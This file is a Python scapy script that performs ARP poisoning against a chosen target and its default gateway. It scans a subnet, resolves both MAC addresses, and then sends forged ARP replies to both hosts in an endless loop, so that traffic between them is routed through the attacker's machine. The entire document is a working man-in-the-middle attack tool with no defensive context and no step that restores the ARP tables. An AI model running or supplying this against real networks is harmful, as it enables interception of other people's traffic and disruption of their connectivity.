import time
import scapy.all as scapy
import argparse
import subprocess

def show_arp_table(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered,unanswered=scapy.srp(combined_packet,timeout=1)
    answered.summary()

def user_input():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--ip-address",dest="ip_address",help="Enter IP address range. Example '10.0.2.1/24'")
    parser.add_argument("-t","--time",default=3,dest="time",help="Cooldown time for arp-poisen. Default value: 3")
    args = parser.parse_args()
    return args


def get_mac_ip_of_target():
    print("\n\nIP address must be owned by target.")
    ip_address = input("Enter IP Address: ")
    arp_request_packet = scapy.ARP(pdst=ip_address)
    broadcat_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcat_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    mac_address = answered_list[0][1].hwsrc
    
    return {"mac":mac_address,"ip":ip_address}

def get_mac_ip_of_gateway():
    print("\n\nThese addresses must be owned by default gateway.")
    ip_address = input("Enter IP Address: ")
    arp_request_packet = scapy.ARP(pdst=ip_address)
    broadcat_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcat_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    mac_address = answered_list[0][1].hwsrc
    return {"mac":mac_address,"ip":ip_address}

def send_packet(mac_ip_of_target, mac_ip_of_gateway):
    # op=2 means arp-response
    arp_response = scapy.ARP(op=2,pdst=mac_ip_of_target["ip"],hwdst=mac_ip_of_target["mac"],psrc=mac_ip_of_gateway["ip"])
    scapy.send(arp_response,verbose=False)


def clear_terminal():
    subprocess.call("clear")

# Getting User Inputs
args = user_input()

# Showing arp table to select valid addresses.
show_arp_table(args.ip_address)

# Getting MAC and IP address of target
mac_ip_of_target = get_mac_ip_of_target()

# Getting MAC and IP address of default gateway
mac_ip_of_gateway = get_mac_ip_of_gateway()

# Clear Terminal
clear_terminal()


packet_counter = 0
try:
    while True:
        # Sending Arp Response Packet to poisen default gateway.
        send_packet(mac_ip_of_target, mac_ip_of_gateway)
        
        # Sending Arp Response Packet to poisen target.
        send_packet(mac_ip_of_gateway,mac_ip_of_target)
        packet_counter +=2
        print(f"\rPackets Send: {packet_counter}",end="")
        print("\nCTRL+C to exit.")
        time.sleep(args.time)
except KeyboardInterrupt:
    print("Exited.")